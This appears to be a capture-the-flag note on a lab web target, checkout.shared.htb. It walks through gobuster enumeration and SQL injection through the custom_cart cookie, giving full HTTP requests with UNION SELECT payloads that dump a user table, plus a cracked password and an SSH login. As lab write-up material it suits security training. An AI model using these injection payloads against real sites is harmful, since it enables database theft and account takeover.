
## Todos

- [x] Purpose
- [ ] Backend
- [x] Path discovery
- [x] Virtual host discovery
- [x] Authentication
- [ ] Input analysis

## Purpose

The checkout page for Shared Store. It appears to aggregate all items in the user's cart based on their ID (each user's cart is simply a URL-encoded cookie). However, the form doesn't submit anywhere--it just `alert()`s a thank you message.

## Backend

Still appears to be Nginx, at least.

## Path Discovery

Returns `200` and the same checkout page for every possible path.

## Virtual Host Discovery

Nothing.

```bash
$ gobuster vhost -u http://checkout.shared.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://checkout.shared.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/11/17 14:21:33 Starting gobuster in VHOST enumeration mode
===============================================================

===============================================================
2022/11/17 14:22:04 Finished
===============================================================
```

## Authentication

There doesn't appear to be any.

## Input Analysis

### `custom_cart` Cookie

Adding items to your cart on `https://shared.htb` creates a client-side cookie named `custom_cart` that is a URL-encoded JSON object where each key is an item's ID and each key's value is the quantity of that item to be purchased, like so:

```json
{"CRAAFTKP":"1"}
```

The `custom_cart` cookie `{"CRAFFTKP1337": "1"}` results in `http://checkout.shared.htb` failing to lookup the item. That indicates the backend is likely taking each key from this object and using it in a SQL query to find the price of each item. It may be vulnerable to SQL injection.

The SQL injection vulnerability is confirmed by injecting the ID `CRAAFTKP'-- -`, which causes the application to successfully fetch the item with ID `CRAAFTKP`.

```sql
SELECT price FROM items WHERE id = '$ID'
```

```sql
SELECT id,product,price FROM items WHERE id = 'CRAAFTKP'-- -'
```

- There are three columns being returned
- All appear to be of type `VARCHAR`
- Databases:
	- `information_schema`
	- `checkout`
		- `product`
			- `id`
			- `code`
			- `price`
		- `user`
			- `id`
			- `username`
			- `password`

### `checkout` Database Enumeration

```http
GET / HTTP/1.1
Host: checkout.shared.htb
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: custom_cart={"CRAAFTKP' UNION SELECT NULL,GROUP_CONCAT(CONCAT('\n', table_name, ':', column_name)),1337 FROM information_schema.columns WHERE table_schema = 'checkout' ORDER BY 1-- -": "1"}
```

### Dumping `checkout.user`

There is only one user in `checkout.user`.

```http
GET / HTTP/1.1
Host: checkout.shared.htb
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: custom_cart={"CRAAFTKP' UNION SELECT NULL,GROUP_CONCAT(CONCAT('\n', username, ':', password)),1337 FROM checkout.user ORDER BY 1-- -": "1"}

```

- `username`: `james_mason`
- `password`: `fc895d4eddc2fc12f995e18c865cf273`

After cracking the hash, `james_mason`'s password is `Soleil101`. This grants SSH access.

```bash
$ ssh james_mason@shared.htb
The authenticity of host 'shared.htb (10.129.41.109)' can't be established.
ED25519 key fingerprint is SHA256:UXHSnbXewSQjJVOjGF5RVNToyJZqtdQyS8hgr5P8pWM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'shared.htb' (ED25519) to the list of known hosts.
james_mason@shared.htb's password:
Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:45:22 2022 from 10.10.14.4
james_mason@shared:~$ id
uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)
```
